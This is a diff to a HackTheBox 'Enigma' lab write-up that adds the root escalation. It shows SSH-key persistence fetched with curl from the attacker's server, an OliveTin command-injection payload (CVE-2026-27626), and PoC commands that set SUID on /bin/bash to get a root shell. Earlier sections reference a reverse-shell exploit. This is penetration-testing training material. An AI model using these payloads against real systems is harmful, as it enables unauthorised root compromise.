@@ -1,8 +1,8 @@
 # HackTheBox — Enigma
 
 **Target:** 10.129.45.193   **DNS:** enigma.htb   **OS:** Linux (Ubuntu 24.04-era)   **Difficulty:** _TBD_   **Date:** 2026-07-03
-**Status:** USER OWNED — privesc to root pending (next session)
-**User flag:** `e5c3a1931804f232d411c29e61c7ba72`
+**Status:** ROOTED — user + root owned
+**User flag:** `e5c3a1931804f232d411c29e61c7ba72`   **Root flag:** `d383f8ea093adb5acb034e1ebe70dc0e`
 
 ---
 
@@ -14,7 +14,7 @@ Enigma is a mail-themed Linux box whose entire foothold chain is built on **cred
 2. Those creds log into **Roundcube webmail**; the mailbox and **password reuse** lead to a second user's mailbox, which leaks **admin credentials for OpenSTAManager**.
 3. OpenSTAManager 2.9.8 is vulnerable to **CVE-2025-69212** (authenticated OS command injection) → reverse shell as `www-data`.
 4. The app's DB config + a cracked bcrypt hash from the app database give the system user **`haris`** → **user flag**.
-5. Privilege escalation to root — **not yet completed** (see "Next Session").
+5. A localhost-only **OliveTin** instance running as root is exploited via **CVE-2026-27626** (`password`-argument OS command injection) → **root**.
 
 **Credential trail (the theme of the box):**
 
@@ -273,16 +273,86 @@ e5c3a1931804f232d411c29e61c7ba72
 
 ---
 
-## 4. Privilege Escalation → Root  _(PENDING — next session)_
+## 3.5 Persistence (haris)
 
-Not yet attempted. Starting points for the next session, in priority order:
+To avoid re-running the RCE each session, planted an SSH key (SSH is pubkey-only, which works in our favour):
 
-1. **sudo rights:** `sudo -l` (password `bestfriends`) — fastest possible win.
-2. **haris's local mailbox:** `/home/haris/mail` exists — on a mail-themed box this may hold root creds or a hint. `cat /home/haris/mail/*`.
-3. **SUID hunt:** `find / -perm -4000 -type f 2>/dev/null`.
-4. **Cron / custom services:** `cat /etc/crontab`, `systemctl list-timers`, `ls -la /opt`.
-5. **Group `users` (gid 100):** check for files/dirs writable by that group (`find / -group users 2>/dev/null`).
-6. **Laurel/auditd note:** commands are logged — worth reading `/etc/audit/` and the laurel config; sometimes reveals what the box is watching for.
+```
+# attacker
+ssh-keygen -t ed25519 -f ~/HTB/enigma_haris -N ""
+cd ~/HTB && python3 -m http.server 8000
+# target (as haris) — transfer via HTTP to avoid paste-mangling of the key
+cd /home/haris/.ssh   # ($HOME resolves correctly; use `su - haris` for a clean env)
+curl -s http://10.10.16.141:8000/enigma_haris.pub -o authorized_keys
+chmod 600 authorized_keys
+# attacker — persistent access
+ssh -i ~/HTB/enigma_haris haris@enigma.htb
+```
+
+*Gotcha:* pasting the long pubkey directly into the Pwnbox shell split it across lines (broken key). Transferring the `.pub` file over HTTP with `curl -o` is reliable. Also prefer `su - haris` (dash) so `$HOME`/`$PATH` are set.
+
+## 4. Privilege Escalation → Root
+
+### 4.1 Local enumeration
+
+- `sudo -l` → **haris is not a sudoer.**
+- `~/mail` → only an empty `.imap` dir; nothing in the spool.
+- **SUID binaries and file capabilities = all stock** (nothing exploitable).
+- **Internal service `127.0.0.1:1337`** (localhost-only, invisible to the external nmap):
+  ```
+  ss -tlnp   # → 127.0.0.1:1337 LISTEN
+  curl -s -i http://127.0.0.1:1337/   # → <title>OliveTin</title>
+  ps aux | grep -i olivetin           # → root  /usr/local/bin/OliveTin
+  ```
+  **OliveTin** — a web UI that runs *predefined shell commands* — running **as root**.
+
+### 4.2 OliveTin config → open guest exec + injectable action
+
+`/etc/OliveTin/config.yaml` (root-owned, world-readable) reveals two things:
+
+1. **Auth is effectively open** — anonymous guests may execute actions:
+   ```yaml
+   authRequireGuestsToLogin: false
+   defaultPermissions: { view: true, exec: true, logs: true }
+   ```
+   (The `alice` / argon2id user block is **commented out** — a red herring; no cracking needed.)
+
+2. An action whose root command interpolates a **`password`-typed argument**:
+   ```yaml
+   - title: Backup Database
+     id: backup_database
+     shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
+     arguments:
+       - name: db_pass
+         type: password      # <-- the vulnerable type
+   ```
+
+### 4.3 CVE-2026-27626 — OliveTin `password`-arg OS command injection
+
+OliveTin's `checkShellArgumentSafety()` blocks dangerous argument types **but not `password`**, so a `password`-typed value passes shell metacharacters straight into `sh -c`. `db_pass` sits inside single quotes (`-p'{{ db_pass }}'`), so a value of `'; <cmd>; echo '` breaks out and runs `<cmd>` **as root**. Guest exec means it's unauthenticated via `POST /api/StartAction`.
+
+**Exploitation** (PoC: `0xh7ml/CVE-2026-27626-PoC`, `-x` = command, injects into `backup_database`):
+
+Tunnel the localhost-only port to the attacker box:
+```
+ssh -i ~/HTB/enigma_haris -L 1337:127.0.0.1:1337 haris@enigma.htb
+```
+
+Confirm root code exec, then plant a SUID bash:
+```
+python3 CVE-2026.27626.py -u 127.0.0.1 -x id                    # → uid=0(root)
+python3 CVE-2026.27626.py -u 127.0.0.1 -x 'chmod +s /bin/bash'
+```
+
+Become root on the target (in the haris SSH session):
+```
+ls -la /bin/bash          # -rwsr-sr-x  (SUID set)
+/bin/bash -p
+id                        # uid=1000(haris) ... euid=0(root) egid=0(root)
+cat /root/root.txt
+```
+
+**ROOT FLAG:** `d383f8ea093adb5acb034e1ebe70dc0e`
 
 ---
 
@@ -293,6 +363,8 @@ Not yet attempted. Starting points for the next session, in priority order:
 - **Credential reuse spraying.** The single default `Enigma2024!` moved us kevin → sarah. Always spray a recovered password across every account/service.
 - **Version-to-CVE matching.** Reading the exact Roundcube (1.6.16, patched → skip) and OpenSTAManager (2.9.8, vulnerable → CVE-2025-69212) versions told us *which* app to attack and which to ignore — no blind exploitation.
 - **App-DB → OS pivot.** When app creds didn't reuse for the system user, the app's own DB held a crackable hash for that user.
+- **Enumerating localhost-only services.** `ss -tlnp` exposed OliveTin on `127.0.0.1:1337` — invisible to the external nmap. The whole root path lived on an internal port; always list local listeners after landing a shell.
+- **Reading config before exploiting.** OliveTin's `config.yaml` showed guest exec was open *and* which action had a `password`-typed argument — pointing straight at CVE-2026-27626 with no blind poking.
 
 **Didn't work / dead ends**
 - **Exploiting Roundcube** — patched build (1.6.16 > 1.6.11). Correctly skipped.
@@ -307,5 +379,8 @@ Not yet attempted. Starting points for the next session, in priority order:
 - **OpenSTAManager 2.9.8 → CVE-2025-69212**: authenticated `.p7m` filename command injection. Any valid login → RCE via `jonathan-corbin/CVE-2025-69212-Authenticated-RCE-PoC` (`-s IP -P PORT` for a reverse shell).
 - **Always read a web app's `config.inc.php` after RCE** — DB creds there frequently reuse for a system user, and the app DB (`zz_users`) holds bcrypt hashes worth cracking (`john --format=bcrypt` / `hashcat -m 3200`).
 - **Note defensive tooling** (`_laurel` user → auditd/Laurel) so you know your actions are logged.
+- **OliveTin as root → CVE-2026-27626**: a `password`-typed action argument bypasses `checkShellArgumentSafety()` → OS command injection as the OliveTin user. If `authRequireGuestsToLogin: false` + `defaultPermissions.exec: true`, it's unauthenticated via `POST /api/StartAction`. PoC `0xh7ml/CVE-2026-27626-PoC` (`-x 'cmd'`). Payload of choice: `chmod +s /bin/bash` → `/bin/bash -p`.
+- **SSH-tunnel localhost-only services** (`ssh -L 1337:127.0.0.1:1337 user@host`) to attack them from the comfort of the attacker box.
+- **SUID-bash escalation:** once you have root code exec, `chmod +s /bin/bash` then `/bin/bash -p` is the simplest, listener-free way to a root shell.
 
 Cross-references: `methodology/core-principles.md` (enumerate first, simple before complex), `checklists/server-side-attacks.md`, `checklists/sql-injection.md`.
